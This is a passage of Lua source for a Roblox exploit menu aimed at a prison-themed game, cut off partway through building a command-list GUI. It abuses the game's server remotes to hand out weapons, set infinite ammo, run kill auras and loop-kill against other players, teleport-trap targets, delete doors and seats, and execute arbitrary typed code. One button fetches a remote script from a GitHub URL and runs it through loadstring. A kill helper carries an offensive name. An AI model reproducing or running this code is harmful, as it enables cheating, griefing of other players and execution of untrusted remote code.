coroutine.wrap(GGFRB_fake_script)()
local function BMABYYT_fake_script() -- ProjectAntiAbusers.WriteInfo.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.WriteInfo)

	script.Parent.MouseButton1Click:connect(function()
		target = FindPlayer(script.Parent.Parent.UsernameTextBox.Text)
		info = "username: "..target.Name.." \n userid: "..target.UserId
		writefile("./antiabusers/" + target.Name + ".txt", info)
	end)
end
coroutine.wrap(BMABYYT_fake_script)()
local function PDXRMW_fake_script() -- ProjectAntiAbusers.giveallgunsbutton.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.giveallgunsbutton)

	script.Parent.MouseButton1Click:connect(function()
		for i,v in pairs(workspace.Prison_ITEMS.giver:GetChildren()) do
			workspace.Remote.ItemHandler:InvokeServer(v.ITEMPICKUP)
		end
	end)
end
coroutine.wrap(PDXRMW_fake_script)()
local function IZAKRHF_fake_script() -- ProjectAntiAbusers.givegunsorderButton.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.givegunsorderButton)

	script.Parent.MouseButton1Click:connect(function()
		if game.Players.LocalPlayer.Name == "Shadows_Overlord" then
			workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
			workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M4A1"].ITEMPICKUP)
			workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
			local player = game:GetService("Players").LocalPlayer
			local gun    = player.Backpack:FindFirstChild("M9")
			local sM     = require(gun:FindFirstChild("GunStates"))
			sM["MaxAmmo"] = math.huge
			sM["StoredAmmo"] = math.huge
			sM["FireRate"] = 0.0001
			sM["AmmoPerClip"] = math.huge
			sM["ReloadTime"] = 0.05
			sM["CurrentAmmo"] = math.huge
			
			local player = game:GetService("Players").LocalPlayer
			local gun    = player.Backpack:FindFirstChild("M4A1")
			local sM     = require(gun:FindFirstChild("GunStates"))
			sM["MaxAmmo"] = math.huge
			sM["StoredAmmo"] = math.huge
			sM["FireRate"] = 0.06
			sM["AmmoPerClip"] = math.huge
			sM["ReloadTime"] = 0.05
			sM["CurrentAmmo"] = math.huge
			
			local player = game:GetService("Players").LocalPlayer
			local gun    = player.Backpack:FindFirstChild("Remington 870")
			local sM     = require(gun:FindFirstChild("GunStates"))
			sM["MaxAmmo"] = math.huge
			sM["StoredAmmo"] = math.huge
			sM["FireRate"] = 0.8
			sM["AmmoPerClip"] = math.huge
			sM["ReloadTime"] = 0.05
			sM["Bullets"] = 18
			sM["CurrentAmmo"] = math.huge
		elseif game.Players.LocalPlayer.Name == "ArticGamerNL" then
			workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M4A1"].ITEMPICKUP)
			workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
			workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
			workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Ak-47"].ITEMPICKUP)
		end
	end)
end
coroutine.wrap(IZAKRHF_fake_script)()
local function CJCTQTT_fake_script() -- ProjectAntiAbusers.autogunspawn.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.autogunspawn)

	gunspawn = false
	script.Parent.MouseButton1Click:connect(function()
		if gunspawn == false then
			gunspawn = true
			script.Parent.TextColor3 = Color3.new(0,255,0)
		else
			gunspawn = false
			script.Parent.TextColor3 = Color3.new(255,0,0)
		end
		game.Players.LocalPlayer.CharacterAdded:connect(function(Character)
			if gunspawn then
				if game.Players.LocalPlayer.Name == "Shadows_Overlord" then
					workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
					workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M4A1"].ITEMPICKUP)
					workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
					local player = game:GetService("Players").LocalPlayer
					local gun    = player.Backpack:FindFirstChild("M9")
					local sM     = require(gun:FindFirstChild("GunStates"))
					sM["MaxAmmo"] = math.huge
					sM["StoredAmmo"] = math.huge
					sM["FireRate"] = 0.0001
					sM["AmmoPerClip"] = math.huge
					sM["ReloadTime"] = 0.05
					sM["CurrentAmmo"] = math.huge
					
					local player = game:GetService("Players").LocalPlayer
					local gun    = player.Backpack:FindFirstChild("M4A1")
					local sM     = require(gun:FindFirstChild("GunStates"))
					sM["MaxAmmo"] = math.huge
					sM["StoredAmmo"] = math.huge
					sM["FireRate"] = 0.06
					sM["AmmoPerClip"] = math.huge
					sM["ReloadTime"] = 0.05
					sM["CurrentAmmo"] = math.huge
					
					local player = game:GetService("Players").LocalPlayer
					local gun    = player.Backpack:FindFirstChild("Remington 870")
					local sM     = require(gun:FindFirstChild("GunStates"))
					sM["MaxAmmo"] = math.huge
					sM["StoredAmmo"] = math.huge
					sM["FireRate"] = 0.8
					sM["AmmoPerClip"] = math.huge
					sM["ReloadTime"] = 0.05
					sM["Bullets"] = 18
					sM["CurrentAmmo"] = math.huge
				elseif game.Players.LocalPlayer.Name == "0hKieran" then
					workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
					workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
					workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
				elseif game.Players.LocalPlayer.Name == "vip123yesthatsme" then
					workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
					workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
					workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M4A1"].ITEMPICKUP)
				elseif game.Players.LocalPlayer.Name == "SuperAngelo177" then
					workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
					workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
					workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
				elseif game.Players.LocalPlayer.Name == "ArticGamerNL" then
					workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M4A1"].ITEMPICKUP)
					workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
					workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
					workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Ak-47"].ITEMPICKUP)
				end
			end
		end)
	end)
end
coroutine.wrap(CJCTQTT_fake_script)()
local function VWUF_fake_script() -- ProjectAntiAbusers.infammo.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.infammo)

	script.Parent.MouseButton1Click:connect(function()
		for i,v in pairs(getgc(true)) do
			if type(v) == "table" and rawget(v, "CurrentAmmo") then
				v.MaxAmmo = math.huge
				v.StoredAmmo = math.huge
				v.CurrentAmmo = math.huge
			end
		end
	end)
end
coroutine.wrap(VWUF_fake_script)()
local function DPHSA_fake_script() -- ProjectAntiAbusers.gunmods.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.gunmods)

	script.Parent.MouseButton1Click:connect(function()
		for i,v in pairs(getgc(true)) do
			if type(v) == "table" and rawget(v, "CurrentAmmo") then
				v.FireRate = 0
				v.MaxAmmo = math.huge
				v.StoredAmmo = math.huge
				v.CurrentAmmo = math.huge
				v.Bullets = 20
				v.AutoFire = true
			end
		end
	end)
end
coroutine.wrap(DPHSA_fake_script)()
local function GTNZ_fake_script() -- ProjectAntiAbusers.KillAura.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.KillAura)

	kauraall = false
	script.Parent.MouseButton1Click:connect(function()
		if kauraall == false then
			kauraall = true
			script.Parent.TextColor3 = Color3.new(0,255,0)
		else
			kauraall = false
			script.Parent.TextColor3 = Color3.new(255,0,0)
		end
		while kauraall == true do
			wait(0.9)
			for i,v in pairs(game.Players:GetPlayers()) do
				if v.Name ~= game.Players.LocalPlayer.Name and not v:IsFriendsWith(game.Players.LocalPlayer.UserId) then
					for i = 1,14 do
						game.ReplicatedStorage.meleeEvent:FireServer(v)
					end
				end
			end
		end
	end)
end
coroutine.wrap(GTNZ_fake_script)()
local function IRQX_fake_script() -- ProjectAntiAbusers.KillAuraCrim.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.KillAuraCrim)

	kacrims = false
	script.Parent.MouseButton1Click:connect(function()
		if kacrims == false then
			kacrims = true
			script.Parent.TextColor3 = Color3.new(0,255,0)
		else
			kacrims = false
			script.Parent.TextColor3 = Color3.new(255,0,0)
		end
		while kacrims == true do
			wait(0.9)
			for i,v in pairs(game.Teams.Criminals:GetPlayers()) do
				if v.Name ~= game.Players.LocalPlayer.Name and not v:IsFriendsWith(game.Players.LocalPlayer.UserId) then
					for i = 1,14 do
						game.ReplicatedStorage.meleeEvent:FireServer(v)
					end
				end
			end
		end
	end)
end
coroutine.wrap(IRQX_fake_script)()
local function NVSMM_fake_script() -- ProjectAntiAbusers.KillAuraPris.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.KillAuraPris)

	kapris = false
	script.Parent.MouseButton1Click:connect(function()
		if kapris == false then
			kapris = true
			script.Parent.TextColor3 = Color3.new(0,255,0)
		else
			kapris = false
			script.Parent.TextColor3 = Color3.new(255,0,0)
		end
		while kapris == true do
			wait(.9)
			for i,v in pairs(game.Teams.Inmates:GetPlayers()) do
				if v.Name ~= game.Players.LocalPlayer.Name and not v:IsFriendsWith(game.Players.LocalPlayer.UserId) then
					for i = 1,14 do
						game.ReplicatedStorage.meleeEvent:FireServer(v)
					end
				end
			end
		end
	end)
end
coroutine.wrap(NVSMM_fake_script)()
local function XCXSBLK_fake_script() -- ProjectAntiAbusers.KillAuraGuards.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.KillAuraGuards)

	kacops = false
	script.Parent.MouseButton1Click:connect(function()
		if kacops == false then
			kacops = true
			script.Parent.TextColor3 = Color3.new(0,255,0)
		else
			kacops = false
			script.Parent.TextColor3 = Color3.new(255,0,0)
		end
		while kacops == true do
			wait(0.9)
			for i,v in pairs(game.Teams.Guards:GetPlayers()) do
				if v.Name ~= game.Players.LocalPlayer.Name and not v:IsFriendsWith(game.Players.LocalPlayer.UserId) then
					for i = 1,14 do
						game.ReplicatedStorage.meleeEvent:FireServer(v)
					end
				end
			end
		end
	end)
end
coroutine.wrap(XCXSBLK_fake_script)()
local function LQOL_fake_script() -- ProjectAntiAbusers.KillAuraSkids.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.KillAuraSkids)

	kaskids = false
	script.Parent.MouseButton1Click:connect(function()
		if kaskids == false then
			kaskids = true
			script.Parent.TextColor3 = Color3.new(0,255,0)
		else
			kaskids = false
			script.Parent.TextColor3 = Color3.new(255,0,0)
		end
		while true do
			wait(0.9)
			for i,v in pairs(game.Teams.Neutral:GetPlayers()) do
				if v.Name ~= game.Players.LocalPlayer.Name then
					for i = 1,14 do
						game.ReplicatedStorage.meleeEvent:FireServer(v)
					end
				end
			end
		end
	end)
end
coroutine.wrap(LQOL_fake_script)()
local function CZOIFKE_fake_script() -- ProjectAntiAbusers.AnnoyAura.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.AnnoyAura)

	script.Parent.MouseButton1Click:connect(function()
		for i,v in pairs(game.Players:GetPlayers()) do
			if v.Name ~= game.Players.LocalPlayer.Name then
				for i = 1,14 do
					game.ReplicatedStorage.meleeEvent:FireServer(v)
				end
			end
		end
	end)
end
coroutine.wrap(CZOIFKE_fake_script)()
local function EMER_fake_script() -- ProjectAntiAbusers.rejoin.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.rejoin)

	script.Parent.MouseButton1Click:connect(function()
		if syn.queue_on_teleport then
			syn.queue_on_teleport([[
						game:GetService('ReplicatedFirst'):RemoveDefaultLoadingScreen()
						repeat wait(.1) until game:GetService('Players').LocalPlayer
						loadstring(game:HttpGet("https://raw.githubusercontent.com/asdiasjiodasj/uihfasdiash/main/asdsdfgdfdfgdfgfasd.lua", true))()
					]])
		end
		game.TeleportService:Teleport(game.PlaceId, game.Players.LocalPlayer)
	end)
end
coroutine.wrap(EMER_fake_script)()
local function EDBB_fake_script() -- ProjectAntiAbusers.doorremove.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.doorremove)

	script.Parent.MouseButton1Click:connect(function()
		workspace.Doors:Destroy()
	end)
end
coroutine.wrap(EDBB_fake_script)()
local function JUNDYXZ_fake_script() -- ProjectAntiAbusers.watergun.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.watergun)

	script.Parent.MouseButton1Click:connect(function()
		plr = game.Players.LocalPlayer
		gun = plr.Backpack:FindFirstChild("Remington 870")
		gun2 = plr.Backpack:FindFirstChild("M9")
		gun3 = plr.Backpack:FindFirstChild("M4A1")
		function color(parent)
			for _, child in pairs(parent:GetChildren()) do
				if child:IsA("Part") then
					child.BrickColor = BrickColor.new("Really red")
					child.Transparency = 0.5
				end
			end
		end
		color(gun.Model)
		color(gun2)
		color(gun3.Model)
	end)
end
coroutine.wrap(JUNDYXZ_fake_script)()
local function IURVIJ_fake_script() -- ProjectAntiAbusers.raincar.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.raincar)

	script.Parent.MouseButton1Click:connect(function()
		game:GetService("RunService").RenderStepped:connect(function()
			game.Players.LocalPlayer.MaximumSimulationRadius = math.huge
		end)
		for i,v in pairs(workspace.Prison_ITEMS.buttons:GetDescendants()) do
			if v.name == "Car Spawner" and v.ClassName == "Part" then
				workspace.Remote.ItemHandler:InvokeServer(v)
			end
		end
		wait(.5)
		for i,v in pairs(workspace.CarContainer:GetChildren()) do
			v:MoveTo(Vector3.new(789.451, 97.9999, 2452.52))
			v.Parent = workspace
		end
	end)
end
coroutine.wrap(IURVIJ_fake_script)()
local function ZKFIWHA_fake_script() -- ProjectAntiAbusers.delseat.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.delseat)

	script.Parent.MouseButton1Click:connect(function()
		for i,v in pairs(workspace:GetDescendants()) do
			if v:IsA("Seat") or v:IsA("VehicleSeat") then
				v:Destroy()
			end
		end
	end)
end
coroutine.wrap(ZKFIWHA_fake_script)()
local function WDVC_fake_script() -- ProjectAntiAbusers.showping.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.showping)

	script.Parent.MouseButton1Click:connect(function()
		ping = (1/wait())
		pingexact = string.sub(ping,0,4)
		game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
			Text = "Your ping is "..pingexact,
			Color = Color3.new(11,94,154),
			FontSize = Enum.FontSize.Size24
		})
	end)
end
coroutine.wrap(WDVC_fake_script)()
local function MYUMH_fake_script() -- ProjectAntiAbusers.Execute.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.Execute)

	script.Parent.MouseButton1Click:connect(function()
		code = script.Parent.Parent.ScriptTextBox.Text
		loadstring(code)()
	end)
end
coroutine.wrap(MYUMH_fake_script)()
local function PCOMOI_fake_script() -- ProjectAntiAbusers.saverespawn.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.saverespawn)

	script.Parent.MouseButton1Click:connect(function()
		saved1 = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
		saved2 = workspace.Camera.CFrame
		saved3 = {}
		for i,v in pairs(game.Players.LocalPlayer.Backpack:GetDescendants()) do
			if v:IsA("Tool") then
				table.insert(saved3, v.Name)
			end
		end
		if game.Players.LocalPlayer.Team == "Neutral" then
			workspace.Remote.loadchar:InvokeServer('', "Bright orange")
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved1
			wait(.06)
			workspace.Camera.CFrame = saved2
			workspace.Remote.TeamEvent:FireServer("Medium stone grey")
			workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver[(unpack(saved3))].ITEMPICKUP)
		elseif game.Players.LocalPlayer.PlayerGui.Home.hud.Topbar.titleBar.Title.Text == "" then
			workspace.Remote.loadchar:InvokeServer("", "Bright red")
			wait(.01)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved1
			wait(.06) 
			workspace.Camera.CFrame = saved2
			workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver[(unpack(saved3))].ITEMPICKUP)
		else
			workspace.Remote.loadchar:InvokeServer()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved1
			wait(.06)
			workspace.Camera.CFrame = saved2
			workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver[(unpack(saved3))].ITEMPICKUP)
		end
	end)
end
coroutine.wrap(PCOMOI_fake_script)()
local function LUMAGS_fake_script() -- ProjectAntiAbusers.infzoomout.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.infzoomout)

	script.Parent.MouseButton1Click:connect(function()
		game.Players.LocalPlayer.CameraMaxZoomDistance = 20000
	end)
end
coroutine.wrap(LUMAGS_fake_script)()
local function UHVFU_fake_script() -- ProjectAntiAbusers.btools.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.btools)

	script.Parent.MouseButton1Click:connect(function()
		local tool1 = Instance.new("HopperBin",game.Players.LocalPlayer.Backpack)
		local tool3 = Instance.new("HopperBin",game.Players.LocalPlayer.Backpack)
		local tool5 = Instance.new("HopperBin",game.Players.LocalPlayer.Backpack)
		tool1.BinType = "Clone"
		tool3.BinType = "Hammer"
		tool5.BinType = "Grab"
	end)
end
coroutine.wrap(UHVFU_fake_script)()

-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local CommandBarFrame = Instance.new("Frame")
local CommandBarTextBox = Instance.new("TextBox")
local UICorner = Instance.new("UICorner")
local UICorner_2 = Instance.new("UICorner")

--Properties:

ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

CommandBarFrame.Name = "CommandBarFrame"
CommandBarFrame.Parent = ScreenGui
CommandBarFrame.BackgroundColor3 = Color3.fromRGB(11, 94, 154)
CommandBarFrame.Position = UDim2.new(0.40952605, 0, 0.0842256323, 0)
CommandBarFrame.Size = UDim2.new(0, 280, 0, 43)

CommandBarTextBox.Name = "CommandBarTextBox"
CommandBarTextBox.Parent = CommandBarFrame
CommandBarTextBox.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
CommandBarTextBox.Position = UDim2.new(0.0164779108, 0, 0.0632958114, 0)
CommandBarTextBox.Size = UDim2.new(0, 269, 0, 36)
CommandBarTextBox.Font = Enum.Font.SourceSans
CommandBarTextBox.PlaceholderText = "Place Your Command Here!"
CommandBarTextBox.Text = ""
CommandBarTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
CommandBarTextBox.TextSize = 18.000

UICorner.CornerRadius = UDim.new(1, 8)
UICorner.Parent = CommandBarTextBox

UICorner_2.CornerRadius = UDim.new(1, 8)
UICorner_2.Parent = CommandBarFrame

-- Scripts:

local function BHAA_fake_script() -- CommandBarTextBox.LocalScript 
	local script = Instance.new('LocalScript', CommandBarTextBox)

	local bar = script.Parent
	local UserInputService = game:GetService("UserInputService")
	
	local function TextBoxFocused(bar)
		bar.BackgroundTransparency = 0.3
	end
	
	local function TextBoxFocusReleased(bar)
		bar.BackgroundTransparency = 0.9
	end
	
	UserInputService.TextBoxFocused:Connect(TextBoxFocused)
	UserInputService.TextBoxFocusReleased:Connect(TextBoxFocusReleased)
	
	local ContextActionService = game:GetService("ContextActionService")
	local ACTION_NAME = "FocusTheTextBox"
	
	function GetPlayer(String)
		local Found = {}
		local strl = String:lower()
		if strl == "all" then
			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
				if v.Name ~= game.Players.LocalPlayer.Name and not v:IsFriendsWith(game.Players.LocalPlayer.UserId) then
					table.insert(Found,v)
				end
			end
		elseif strl == "others" then
			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
				if v.Name ~= game.Players.LocalPlayer.Name and not v:IsFriendsWith(game.Players.LocalPlayer.UserId) then
					table.insert(Found,v)
				end
			end   
		elseif strl == "me" then
			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
				if v.Name == game.Players.LocalPlayer.Name then
					table.insert(Found,v)
				end
			end
		elseif strl == "cops" then
			for i,v in pairs(game.Teams.Guards:GetPlayers()) do
				if v.Name ~= game.Players.LocalPlayer.Name and not v:IsFriendsWith(game.Players.LocalPlayer.UserId) then
					table.insert(Found,v)
				end
			end
		elseif strl == "inmates" then
			for i,v in pairs(game.Teams.Inmates:GetPlayers()) do 
				if v.Name ~= game.Players.LocalPlayer.Name and not v:IsFriendsWith(game.Players.LocalPlayer.UserId) then
					table.insert(Found,v)
				end
			end
		elseif strl == "skids" then
			for i,v in pairs(game.Teams.Neutral:GetPlayers()) do
				if v.Name ~= game.Players.LocalPlayer.Name then
					table.insert(Found,v)
				end
			end
		elseif strl == "crims" then
			for i,v in pairs(game.Teams.Criminals:GetPlayers()) do
				if v.Name ~= game.Players.LocalPlayer.Name and not v:IsFriendsWith(game.Players.LocalPlayer.UserId) then
					table.insert(Found,v)
				end
			end
		else
			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
				if v.Name:lower():sub(1, #String) == String:lower() then
					table.insert(Found,v)
				end
			end
			
		end
		return Found    
	end
	
	function getGun(dir)
		for _, v in pairs(dir:GetChildren()) do
			if v:IsA("Tool") and v.Name == "M9" then
				guns = v
				return
			end
		end
	end
	
	function rape(v)
		workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
		getGun(game.Players.LocalPlayer.Backpack)
		getGun(game.Players.LocalPlayer.Character)
		if v.Character:FindFirstChild("HumanoidRootPart") then
			pcall(
				function()
					local i = 1
					if not guns then
						workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS["M9"].ITEMPICKUP)
					end
					while v.Character.Humanoid.Health > 0 and i < 100 do
						i = i + 1
						args = {
							[1] = {
								[1] = {
									["RayObject"] = Ray.new(),
									["Distance"] = 1,
									["Cframe"] = CFrame.new(),
									["Hit"] = v.Character.Head,
								},
							},
							[2] = guns,
						}
						game.ReplicatedStorage.ShootEvent:FireServer(unpack(args))
					end
				end
			)
		end
		guns = nil
	end
	
	game.Players.LocalPlayer:GetMouse().KeyDown:connect(function(Key)
		if Key == ";" then
			script.Parent:CaptureFocus()
			wait()
			script.Parent.Text = ""
		end
	end)
	
	script.Parent.FocusLost:connect(function(enterPressed)
		if enterPressed then
			if string.sub(script.Parent.Text, 1, 5) == ("kill ") then
				for i,v in pairs(GetPlayer(string.sub(script.Parent.Text, 6))) do
					i = 1
					repeat
						i = i-1
						workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
						rape(v)
					until i == 0
				end
			elseif string.sub(script.Parent.Text, 1, 5) == "cuffs" then
				a = Instance.new("Tool")
				a.Parent = game.Players.LocalPlayer.Backpack
				a.Name = "Handcuffs"
			elseif string.sub(script.Parent.Text, 1, 9) == "loopkill " then
				for i,v in pairs(GetPlayer(string.sub(script.Parent.Text, 10))) do
					i = 1
					repeat
						workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
						rape(v)
					until i == 0
				end
			elseif string.sub(script.Parent.Text, 1, 7) == "arrest " then
				for i,v in pairs(GetPlayer(string.sub(script.Parent.Text, 8))) do
					i = 3
					repeat
						i = i-1
						saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
						wait(0.2)
						workspace.Remote.arrest:InvokeServer(v.Character.HumanoidRootPart)
						wait(0.2)
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
					until i == 0
				end
			elseif string.sub(script.Parent.Text, 1, 5) == "trap " then
				for i,v in pairs(GetPlayer(string.sub(script.Parent.Text, 6))) do
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-306.426514, 54.2398338, 1982.18201, 0.812489867, -4.78796665e-08, 0.582975328, 7.8811361e-08, 1, -2.77091701e-08, -0.582975328, 6.84584975e-08, 0.812489867)
					wait(0.2)
					workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
					if v and v.Character then
						saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
						game.Players.LocalPlayer.Character.Humanoid.Sit = false
						for Y,Z in pairs(workspace.Prison_ITEMS.giver:GetChildren()) do
							if Z.Name == "Remington 870" then
								workspace.Remote.ItemHandler:InvokeServer(Z.ITEMPICKUP)
							end
						end
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
						game.Players.LocalPlayer.Character.Humanoid.Name = 1
						cl = game.Players.LocalPlayer.Character["1"]:Clone()
						cl.Parent = game.Players.LocalPlayer.Character
						cl.Name = "Humanoid"
						wait()
						game.Players.LocalPlayer.Character["1"]:Destroy()
						game.workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
						game.Players.LocalPlayer.Character.Animate.Disabled = true
					end
					game.Players.LocalPlayer.Character.Animate.Disabled = false
					game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
					for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
						if v.Name == "Remington 870" then
							game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
						end
					end
					v.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-1)
					wait(0.3)
					workspace.Remote.loadchar:InvokeServer()
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
				end
			elseif string.sub(script.Parent.Text, 1, 5) == "void " then
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(778.280029, 396.23996, 2674.35278, 0.998099327, 4.16638704e-06, -0.0616256408, 3.69708708e-08, 1, 6.82067985e-05, 0.0616256408, -6.80794183e-05, 0.998099327)
				wait(0.2)
				saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
				if v and v.Character then
					game.Players.LocalPlayer.Character.Humanoid.Sit = false
					for Y,Z in pairs(workspace.Prison_ITEMS.giver:GetChildren()) do
						if Z.Name == "Remington 870" then
							workspace.Remote.ItemHandler:InvokeServer(Z.ITEMPICKUP)
						end
					end
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
					game.Players.LocalPlayer.Character.Humanoid.Name = 1
					cl = game.Players.LocalPlayer.Character["1"]:Clone()
					cl.Parent = game.Players.LocalPlayer.Character
					cl.Name = "Humanoid"
					wait()
					game.Players.LocalPlayer.Character["1"]:Destroy()
					game.workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
					game.Players.LocalPlayer.Character.Animate.Disabled = true
				end
				game.Players.LocalPlayer.Character.Animate.Disabled = false
				game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
				for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
					if v.Name == "Remington 870" then
						game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
					end
				end
				v.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-1)
				wait(0.3)
				workspace.Remote.loadchar:InvokeServer()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
			elseif string.sub(script.Parent.Text, 1, 5) == "goto " then
				for i,v in pairs(GetPlayer(string.sub(script.Parent.Text, 6))) do
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
				end
			elseif string.sub(script.Parent.Text, 1, 6) == "unview" then
				workspace.Camera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
			elseif string.sub(script.Parent.Text, 1, 5) == "view " then
				for i,v in pairs(GetPlayer(string.sub(script.Parent.Text, 6))) do
					workspace.Camera.CameraSubject = v.Character.Humanoid
				end
			elseif string.sub(script.Parent.Text, 1, 4) == "cmds" then
				local ScreenGui = Instance.new("ScreenGui")
				local ScrollingFrame = Instance.new("ScrollingFrame")
				local TextLabel = Instance.new("TextLabel")
				local TextLabel_2 = Instance.new("TextLabel")
				local TextLabel_3 = Instance.new("TextLabel")
				local TextLabel_4 = Instance.new("TextLabel")
				local TextLabel_5 = Instance.new("TextLabel")
				local TextLabel_6 = Instance.new("TextLabel")
				local TextLabel_7 = Instance.new("TextLabel")
				local TextLabel_8 = Instance.new("TextLabel")
				local TextLabel_9 = Instance.new("TextLabel")
				local TextLabel_10 = Instance.new("TextLabel")
				local TextLabel_11 = Instance.new("TextLabel")
				local TextLabel_12 = Instance.new("TextLabel")
				local TextLabel_13 = Instance.new("TextLabel")
				local TextLabel_14 = Instance.new("TextLabel")
				local TextLabel_15 = Instance.new("TextLabel")
				local TextLabel_16 = Instance.new("TextLabel")
				local TextLabel_17 = Instance.new("TextLabel")
